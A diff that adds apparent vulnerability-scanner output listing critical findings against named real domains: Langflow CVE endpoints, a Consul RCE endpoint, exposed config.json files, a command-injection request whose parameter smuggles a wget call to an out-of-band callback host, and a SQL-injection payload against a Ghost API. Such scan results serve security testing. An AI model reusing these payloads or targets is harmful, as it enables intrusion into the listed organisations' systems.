@@ -1,0 +1,16 @@
+[CVE-2014-3206] [http] [critical] https://mail.particle.network/backupmgt/pre_connect_check.php?auth_name=fail;wget+http://d98b9io226q3em32fod0xztazctef8ju4.oast.site;
+[CVE-2025-34291] [http] [critical] https://internal.langflow.org/api/v1/refresh
+[CVE-2026-21445] [http] [critical] https://internal.langflow.org/api/v1/monitor/messages
+[CVE-2026-26980] [http] [critical] https://blog.web3auth.io/ghost/api/content/tags/?key=24330868b746f42d2fb5110e63&filter=slug:['||CASE+WHEN+1=0+THEN+0+ELSE+EXP(710)+END||',hash-import-2024-02-27-00-35]
+[CVE-2026-33017] [http] [critical] https://internal.langflow.org/api/v1/version
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://mfe-fiat-send.sandbox.bvnk.com/config.json [""baseUrl": "https://api.sandbox.bvnk.com""] [path="/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://mfe-fiat-send.test.bvnk.com/config.json [""baseUrl": "https://api.test.bvnk.com""] [path="/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://mfe-profile.staging.bvnk.com/config.json [""baseUrl": "https://api.staging.bvnk.com""] [path="/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://mfe-profile.test.bvnk.com/config.json [""baseUrl": "https://api.test.bvnk.com""] [path="/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://mfe-send.bvnk.com/config.json [""baseUrl": "https://api.bvnk.com""] [path="/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://mfe-send.sandbox.bvnk.com/config.json [""baseUrl": "https://api.sandbox.bvnk.com""] [path="/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://mfe-send.staging.bvnk.com/config.json [""baseUrl": "https://api.staging.bvnk.com""] [path="/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://mfe-webhooks.bvnk.com/config.json [""baseUrl": "https://api.bvnk.com""] [path="/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://mfe-webhooks.sandbox.bvnk.com/config.json [""baseUrl": "https://api.sandbox.bvnk.com""] [path="/config.json"]
+[config-json-exposure-fuzz:endpoints] [http] [critical] https://packages.dynamic.xyz/config.json [""url": "https://github.com/bulyshko/config.json"",""url": "https://github.com/bulyshko/config.json/issues"",""url": "https://bulyshko.com"",""url": "http://romualdbulyshko.com""] [path="/config.json"]
+[hashicorp-consul-rce] [http] [critical] https://mail.particle.network/v1/agent/service/register
